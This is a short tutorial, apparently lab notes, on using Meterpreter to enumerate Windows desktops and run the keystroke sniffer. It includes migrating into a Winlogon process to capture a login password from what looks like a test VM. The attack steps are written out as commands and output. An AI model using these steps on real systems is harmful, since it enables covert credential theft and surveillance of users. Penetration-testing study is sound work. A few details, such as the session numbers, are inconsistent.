## Listing all the accessible desktops and window stations:
```python
meterpreter > enumdesktops
Enumerating all accessible desktops

Desktops
========

    Session  Station  Name
    -------  -------  ----
    1        WinSta0  Default
    1        WinSta0  Winlogon
```
Here you can see that all the available desktop stations are associated with session 1.

## Listing the current desktop in which our Meterpreter session is working:
```python
meterpreter > getdesktop
Session 1\W\D
```

## Setting the current desktop of Meterpreter to another available desktop station:
```python
meterpreter > setdesktop
Changed to desktop WinSta0\Default
```

## Starting the keystroke sniffer in the current active desktop station:
```python
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```

## Output of keystroke sniffer:
```python
meterpreter > keyscan_dump
Dumping captured keystrokes...
 666macos<^S>
```

### Some points to focus before using keystroke sniffer:
1. Windows desktop is divided into different sessions. Session 0 represents the console. The other sessions, Session 1, Session 2, and so on, represent remote desktop sessions.
2. Every Windows session can be comprised of different stations, out of which `WinSta0` is the only interactive station, meaning that it is the only station that the user can interact with.
3. `WinSta0` consists of three different desktops, namely, `Default`, `Disconnect`, and `Winlogon`. 
4. The `Default` desktop is associated with all the applications and tasks that we perform on our desktop.
5. The `Disconnect` desktop is concerned with the screensaver lock desktop
6. The `Winlogon` desktop with the Windows login screen.
7. IMP - Each desktop has its own keyboard buffer. So, if you have to sniff the keystrokes from the `Default` desktop, you will have to make sure that your current Meterpreter active browser is set to `Session 0/WinSta0/Default`. 
8. If you have to sniff the login password, you will have to change the active desktop to `Session 0/WinSta0/Winlogon`.

## Lets sniff keystrokes from `Default` desktop station:
```python
meterpreter > getdesktop
Session 1\W\D
meterpreter > setdesktop
Changed to desktop WinSta0\Default
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > getdesktop
Session 1\WinSta0\Default
meterpreter > keyscan_dump
Dumping captured keystrokes...
 666macos<^S>
```

## Lets sniff keystrokes from `Winlogon` desktop station:
```python
meterpreter > getdesktop
Session 1\W\D
meterpreter > migrate 432
[*] Migrating from 3812 to 432...
[*] Migration completed successfully.
meterpreter > getdesktop
Session 2\W\W
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
vagrant<CR>
```

## Migrating to again `Default` desktop station or session:
```python
meterpreter > migrate -N explorer.exe
[*] Migrating from 432 to 3236...
[*] Migration completed successfully.
```

